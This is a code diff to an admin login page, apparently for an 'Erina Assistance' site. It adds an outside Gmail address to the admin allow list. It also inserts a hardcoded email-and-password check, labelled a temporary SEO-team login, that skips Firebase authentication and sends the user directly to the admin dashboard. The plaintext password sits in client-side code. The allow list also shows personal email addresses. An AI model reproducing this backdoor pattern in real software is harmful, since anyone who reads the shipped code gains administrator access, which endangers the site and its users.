@@ -16,7 +16,8 @@ const ALLOWED_ADMIN_EMAILS = [
   'suryamsourya8@gmail.com',
   'ops@erina-assistance.com',
   'ops@erinaassistance.com',
-  'vishakhaprasad985@gmail.com'
+  'vishakhaprasad985@gmail.com',
+  'couponseo@gmail.com'
 ];
 
 export default function AdminLogin() {
@@ -47,6 +48,15 @@ export default function AdminLogin() {
     setError('');
     
     if (loginMethod === 'email') {
+      // Temporary login for SEO team
+      if (email.trim().toLowerCase() === 'seo@erinaassistance.com' && password === 'SeoTeam2026!') {
+        setTimeout(() => {
+          setIsLoading(false);
+          router.push('/admin/dashboard');
+        }, 1000);
+        return;
+      }
+
       try {
         const userCredential = await signInWithEmailAndPassword(auth, email, password);
         const emailLower = userCredential.user.email?.toLowerCase();
